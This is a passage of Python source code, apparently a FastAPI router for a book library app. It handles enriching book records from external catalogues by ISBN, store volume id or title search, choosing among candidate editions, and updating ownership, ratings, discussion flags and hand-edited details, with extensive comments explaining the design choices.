    search. **Exact keys first, and the store identifier is an exact key**: a
    book imported from Google Play Books carries a volume id and no ISBN, so
    without that middle step it is matched by its title, which is the weakest
    instrument here. **Which
    catalogues either of those asks is the library's own provider list**, set
    in Settings: the roster holds nine lookup sources that answer an ISBN and
    eight search sources that answer a title, the leading pair is asked together
    and the rest one at a time, and a source switched off is not asked on either
    path. Google Books answers only when its own section is on and a key is in
    force, so a library missing either asks one fewer on each path.

    **No API key is required.** This was Google-only and refused outright
    without a key, which made it useless for exactly the books the German and
    French catalogues were added for: a 978-3 ISBN that Google does not carry
    would report "no key" rather than the full record the DNB was holding.

    Only empty scalar fields are filled unless `overwrite` is set: enrichment
    adds what is missing, it does not overrule what somebody typed.
    Classifications need a selected candidate through `enrich/apply`.
    """
    # One `Enquiry` for all three paths below, because they must not be able to
    # ask different sets of catalogues or send a different login. It holds the
    # access privately, so there is nothing here to rebuild between them.
    enquiry = catalogue_access.Enquiry.for_a_member_request(
        db, member=current_user.username
    )
    # **Refused up front rather than per half.** Both halves are optional on
    # their own, so without this a library with nothing switched on got the
    # lookup's 409 and then the search's failure from one request. Asking
    # nothing is one answer, not two.
    enquiry.refuse_if_nothing_is_asked()

    # `as_match()` on both paths, and it carries no Classifications by
    # construction. That is ADR 0006 held by the type rather than by this
    # handler remembering: an unattended write has nothing to write.
    fields: dict[str, Any] | None = None
    assertions: tuple[catalogue.AuthorityAssertion, ...] = ()
    recorded = RecordedAssertions(stored=[], refused=[])
    if book.isbn:
        result = await enquiry.lookup(book.isbn)
        # `found`, like `lookup_isbn` and `refresh_metadata`, rather than a bare
        # test for the record. This is the third consumer of a `Lookup` and the
        # only one that writes to a Book without telling the Member why nothing
        # happened, so it is the one that must not decide on a different
        # question from its two siblings.
        if result.found:
            assert result.record is not None  # noqa: S101  narrowing, not validation
            fields = result.record.as_match()
            # **Only on this branch.** A record found by the Book's own ISBN
            # asserts who wrote *this* Book; the title and author search below
            # asserts who wrote something with a similar name, which is a
            # candidate and reaches the store only through
            # `POST /authors/identifiers`. `as_match()` carries no assertions,
            # so the search branch has nothing to write even by mistake, which
            # is the same property ADR 0006 gets from it for Classifications.
            #
            # Held rather than recorded here: the write happens below
            # `merge_into`, once the Book's credit line is final.
            assertions = result.record.author_identifiers

    if fields is None:
        # **Before the title search and after the ISBN, which is the whole
        # ordering.** A store's own identifier is an exact key, so it outranks
        # matching by title and author; an ISBN is an exact key the free
        # catalogues answer to, so it outranks a metered one.
        #
        # A Google Play Books Takeout is the case this exists for: it carries a
        # volume id on every book and no ISBN anywhere, so without this branch
        # every book of an imported library is matched by its title.
        volume_id = _resolvable_volume_id(book)
        if volume_id is not None:
            volume = await enquiry.volume(volume_id)
            if volume.found:
                assert volume.record is not None  # noqa: S101  narrowing, not validation
                # No `assertions`, unlike the ISBN branch above. `Record.
                # author_identifiers` is empty for every source but the DNB, so
                # there is nothing here to record even by mistake, and
                # `as_match()` carries no Classifications by construction.
                fields = volume.record.as_match()

    if fields is None:
        # No ISBN, no resolvable store identifier, or nobody carries this
        # edition under either.
        query = " ".join(part for part in (book.title, book.author) if part)
        matches = await enquiry.search(query, limit=1)
        if matches:
            fields = matches[0].as_match()

    if fields is None:
        return BookEnrichmentOut(
            book=_with_refusals(book_to_out(book, current_user, db), recorded),
            updated_fields=[],
            found=False,
        )

    # Bounded here rather than trusted: `fields` is whatever a catalogue
    # answered, and `merge_into` writes twelve columns from it.
    updated = google_books.merge_into(book, _bounded_match(fields), overwrite=overwrite)
    # This route chooses no Catalogue record. Its classification evidence must
    # not reach the Book or be reported as an updated field.
    if updated:
        # `to_thread` because this handler is a coroutine. See refresh_metadata.
        await asyncio.to_thread(_store_cover, book)
        db.commit()
        db.refresh(book)

    # **Below `merge_into`, and below the commit, and both matter.**
    #
    # Below `merge_into` because it skips `author` whenever the Book already has
    # one and `overwrite` is false, which is the default. Recorded above it, the
    # credit line was whatever it had been, the catalogue's spelling of the
    # author had never been adopted, and identifiers were filed under spellings
    # no Book carried: invisible, undeletable, reported as stored.
    #
    # Below the commit for the reason `refresh_metadata` states: this helper
    # commits internally, so between `merge_into` and `db.commit()` it decided
    # the transaction boundary for the Book's own pending fields, with
    # `_store_cover` sitting in the gap. That is safe today only because
    # `covers.resolve_and_store` does not raise, which is a property of another
    # module rather than of this one. Here nothing of the Book's is pending.
    recorded = Authorship.seen_by(db, current_user.id).record_catalogue_assertions(
        assertions, credited=book.author
    )

    return BookEnrichmentOut(
        book=_with_refusals(book_to_out(book, current_user, db), recorded),
        updated_fields=updated,
        found=True,
    )


@router.post("/{book_id}/enrich/apply", response_model=BookEnrichmentOut)
def apply_enrichment(
    payload: BookMatch,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
) -> BookEnrichmentOut:
    """Fill this book in from an edition the member picked.

    Separate from `POST /enrich`, which chooses for them. This exists because
    choosing automatically is wrong often enough to matter: a paperback and its
    hardback are different page counts and different covers, and a search will
    happily return the wrong printing of the right book. Nothing is written
    until somebody has looked at the candidates and said which one it is.

    The merge rule is the same either way, and it is the server's rather than
    the client's: only empty fields are filled unless `overwrite` is set, so a
    publisher somebody typed in by hand is never quietly replaced.

    Selecting the row also confirms its Classifications. Automatic enrichment
    and refresh do not have that confirmation.
    """
    # The body goes in whole. `merge_into` takes a `BookMatch` and reads the
    # twelve names it writes off it, so the three fields this used to exclude
    # by hand (`source`, `suggested_tag_ids`, `classifications`) are excluded
    # by it never naming them, and a field added to the schema cannot be
    # written here by forgetting to list it.
    updated = google_books.merge_into(book, payload, overwrite=overwrite)
    # Already validated and already bounded by `BookMatch`, so the payload's
    # own models go in rather than a second pass through `classifications.bounded_headings`.
    if add_headings(book, payload.classifications, db):
        updated.append("classifications")
    if updated:
        _store_cover(book)
        db.commit()
        db.refresh(book)

    return BookEnrichmentOut(
        book=book_to_out(book, current_user, db), updated_fields=updated, found=True
    )


@router.get("/{book_id}/enrich/candidates", response_model=list[BookMatch])
async def enrichment_candidates(
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> list[BookMatch]:
    """Other editions of this book, so the right one can be chosen.

    Useful when the automatic match picks a different printing: the page count
    and cover of a paperback and its hardback are not the same.

    **Two routes, and `metadata.candidates` holds the rule between them.** Open
    Library's work cluster answers this exactly, when it has the book; the
    search across every catalogue answers it approximately, for everything
    else, and is ranked so a German edition of a German book is not buried
    under whatever Google happened to return first.
    """
    query = " ".join(part for part in (book.title, book.author) if part)

    # `candidates` refuses on the search roster rather than the lookup one,
    # because it runs a title search internally: it reaches the catalogues by the
    # query above and not by this book's ISBN. Both the roster and the wording are
    # the door's.
    matches = await catalogue_access.Enquiry.for_a_member_request(
        db, member=current_user.username
    ).candidates(query, isbn=book.isbn, limit=5, prefer_language=book.language)
    return _match_rows(matches, all_tags=None)


@router.patch("/{book_id}/ownership", response_model=BookOut)
def set_ownership(
    payload: OwnershipUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    book.ownership = payload.ownership
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/rating", response_model=BookOut)
def set_rating(
    payload: BookRatingUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Rate a book, or clear the rating with a null.

    Read access, like status, and for the same reason: a rating is one person's
    opinion and changes nothing for anyone else. It deliberately does not touch
    the reading dates, because rating a book is not a claim about having
    finished it just now.
    """
    Reading.by(db, current_user.id).rate(book.id, payload.rating)
    db.commit()
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/discuss", response_model=BookOut)
def set_discuss(
    payload: BookDiscussUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Offer to talk about this book, or withdraw the offer.

    Read access, like status and rating: it is the caller's own flag on a book
    they can see, and it changes nothing about the book itself.

    Unlike those two it is **read by everybody**, which is the point. It says
    nothing about whether the caller has read the book; `my_status` stays
    private.

    Creates the `user_books` row when there is none, exactly as the status and
    rating paths do: absence of a row means unread, not the absence of a
    member.
    """
    Reading.by(db, current_user.id).offer_to_discuss(book.id, payload.wants_to_discuss)
    db.commit()
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}", response_model=BookOut)
def update_book_details(
    payload: BookDetailsUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Correct the catalogue entry by hand.

    `exclude_unset` is what makes a partial update partial: an absent field is
    left alone and an explicit null clears where the column allows one. Without
    it every unsent field would arrive as None and wipe the record, which is the
    classic PATCH bug. A null for a column the database will not leave empty is
    refused by `BookDetailsUpdate` before it reaches here, because it used to
    reach the flush and answer 500.

    **`categories` clears on an empty list rather than on a null**, because its
    request shape is a list and its column is one joined string. This is the
    only route that removes a subject: the create route writes them, the
    catalogue gap fill and the merge's absorb add them, and an overwriting
    enrich cannot empty the column because the merge skips an empty incoming
    value. Before this the only removal was deleting the book, and the column
    is served to readers with no account.
    """
    fields = payload.model_dump(exclude_unset=True)
    # The loop rather than one `pop` per name, for the reason `_create_book`
    # gives at its own pop: this list and the import time refusal beneath
    # `BookDetailsUpdate` are the same object, so a container field added to
    # that body stops every test run there rather than reaching this `setattr`
    # and failing the flush on somebody's library.
    reshaped = [name for name in POPPED_BEFORE_THE_ASSIGNMENT if name in fields]
    for name in reshaped:
        fields.pop(name)

    for field, value in fields.items():
        setattr(book, field, value)

    # Paired with the pop deliberately, exactly as at the create door: a pop
    # with no write is a 200 that accepted a field and stored nothing, which is
    # the quietest failure available here.
    # `tests/schemas/test_book.py::TestEveryReshapedFieldIsWrittenAtTheRoute`
    # reads this function's source and holds both halves.
    if "categories" in reshaped:
        book.categories = google_books.join_categories(payload.categories)

    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)
